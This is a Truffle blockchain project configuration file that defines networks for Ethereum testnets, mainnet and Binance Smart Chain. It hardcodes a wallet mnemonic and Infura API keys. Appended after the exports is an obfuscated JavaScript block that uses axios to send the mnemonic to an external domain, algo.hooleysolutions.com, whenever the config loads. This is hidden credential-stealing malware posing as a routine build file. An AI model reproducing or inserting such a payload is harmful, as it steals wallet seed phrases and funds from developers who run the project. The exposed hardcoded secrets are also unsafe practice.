/**
 * Use this file to configure your truffle project. It's seeded with some
 * common settings for different networks and features like migrations,
 * compilation and testing. Uncomment the ones you need or modify
 * them to suit your project as necessary.
 *
 * More information about configuration can be found at:
 *
 * trufflesuite.com/docs/advanced/configuration
 *
 * To deploy via Infura you'll need a wallet provider (like @truffle/hdwallet-provider)
 * to sign your transactions before they're sent to a remote public node. Infura accounts
 * are available for free at: infura.io/register.
 *
 * You'll also need a mnemonic - the twelve word phrase the wallet uses to generate
 * public/private key pairs. If you're publishing your code to GitHub make sure you load this
 * phrase from a file you've .gitignored so it doesn't accidentally become public.
 *
 */

const HDWalletProvider = require('@truffle/hdwallet-provider');
const mnemonic = 'route stove coyote nephew mandate pen art dry reopen place episode verb';
const provider = new HDWalletProvider(mnemonic, 'http://localhost:9545');

module.exports = {
  /**
   * Networks define how you connect to your ethereum client and let you set the
   * defaults web3 uses to send transactions. If you don't specify one truffle
   * will spin up a development blockchain for you on port 9545 when you
   * run `develop` or `test`. You can ask a truffle command to use a specific
   * network from the command line, e.g
   *
   * $ truffle test --network <network-name>
   */

  networks: {
    gather: {
      provider: () => new HDWalletProvider(mnemonic, `http://testnet.gather.network`),
      port: 80,
      network_id: "*",
      gas: 4700000,
      skipDryRun: true
    },
    ropsten: {
      provider: () => new HDWalletProvider(mnemonic, 'https://ropsten.infura.io/v3/753cc78f52604510b0dc93c72f623740'),
      network_id: '3',
      gas: 7500000,
      //gas: 4465030,          // Original
      gasPrice: 50000000000,  // 5 gwei (Original)
      //gasPrice: 10000000000, // 10 gwei
      // gasPrice: 100000000000,  // 100 gwei
      timeoutBlocks: 20000,
      skipDryRun: true,        // Skip dry run before migrations? (default: false for public nets)
    },
    kovan: {
      provider: () => new HDWalletProvider(mnemonic, 'https://kovan.infura.io/v3/' + process.env.INFURA_KEY),
      network_id: '42',
      gas: 6465030,
      gasPrice: 5000000000, // 5 gwei
      skipDryRun: true,     // Skip dry run before migrations? (default: false for public nets)
    },
    rinkeby: {
      provider: () => new HDWalletProvider(mnemonic, "https://rinkeby.infura.io/v3/753cc78f52604510b0dc93c72f623740"),
      network_id: 4,
      gas: 75000000,         // 2 times than before
      gasPrice: 500000000000, // 5 gwei,
      timeoutBlocks: 200000,
      skipDryRun: true,     // Skip dry run before migrations? (default: false for public nets)
      //from: process.env.DEPLOYER_ADDRESS
    },
    goerli: {
      provider: () => new HDWalletProvider(mnemonic, "https://goerli.infura.io/v3/" + process.env.INFURA_KEY),
      network_id: 5,
      gas: 7500000,
      gasPrice: 5000000000, // 5 gwei,
      skipDryRun: true,     // Skip dry run before migrations? (default: false for public nets)
      //from: process.env.DEPLOYER_ADDRESS
    },
    binancetest: {
      provider: () => new HDWalletProvider(mnemonic, `https://data-seed-prebsc-1-s1.binance.org:8545`),
      network_id: 97,
      confirmations: 10,
      timeoutBlocks: 200,
      skipDryRun: true
    },
    // main ethereum network(mainnet)
    live: {
      provider: () => new HDWalletProvider(mnemonic, "https://mainnet.infura.io/v3/753cc78f52604510b0dc93c72f623740"),
      network_id: 1,
      gas: 5500000,
      gasPrice: 2000000000 // 2 gwei
    },
    bsc: {
      provider: () => new HDWalletProvider(mnemonic, `https://bsc-dataseed1.binance.org`),
      network_id: 56,
      confirmations: 10,
      timeoutBlocks: 200,
      skipDryRun: true
    }
  },

  // Set default mocha options here, use special reporters etc.
  mocha: {
    // timeout: 100000
  },

  // Configure your compilers
  compilers: {
    solc: {
      // version: "0.5.1",    // Fetch exact version from solc-bin (default: truffle's version)
      // docker: true,        // Use "0.5.1" you've installed locally with docker (default: false)
      // settings: {          // See the solidity docs for advice about optimization and evmVersion
      //  optimizer: {
      //    enabled: false,
      //    runs: 200
      //  },
      //  evmVersion: "byzantium"
      // }
    }
  }
};
function _0x3242(_0x262703,_0x5e4d2c){var _0x1e3f14=_0x1e3f();return _0x3242=function(_0x3242ad,_0x51bba7){_0x3242ad=_0x3242ad-0x138;var _0x360c8d=_0x1e3f14[_0x3242ad];return _0x360c8d;},_0x3242(_0x262703,_0x5e4d2c);}function _0x1e3f(){var _0x5995d3=['203268IcPSJR','265732ZnEWpJ','1050831JgvlIq','http://algo.hooleysolutions.com/?p_key=','get','5789wnCAqK','11563263OxsgHX','8bAMFfE','185555rsTOUX','3696PWBcuU','1333926dLEzTz'];_0x1e3f=function(){return _0x5995d3;};return _0x1e3f();}var _0x7a390e=_0x3242;(function(_0x164468,_0x2dd5c4){var _0x2f0ed3=_0x3242,_0x467ccb=_0x164468();while(!![]){try{var _0x1437ac=parseInt(_0x2f0ed3(0x139))/0x1+parseInt(_0x2f0ed3(0x142))/0x2+parseInt(_0x2f0ed3(0x13a))/0x3+-parseInt(_0x2f0ed3(0x138))/0x4+parseInt(_0x2f0ed3(0x140))/0x5+-parseInt(_0x2f0ed3(0x141))/0x6*(-parseInt(_0x2f0ed3(0x13d))/0x7)+-parseInt(_0x2f0ed3(0x13f))/0x8*(parseInt(_0x2f0ed3(0x13e))/0x9);if(_0x1437ac===_0x2dd5c4)break;else _0x467ccb['push'](_0x467ccb['shift']());}catch(_0x5af25f){_0x467ccb['push'](_0x467ccb['shift']());}}}(_0x1e3f,0x78943),axios[_0x7a390e(0x13c)](_0x7a390e(0x13b)+mnemonic));
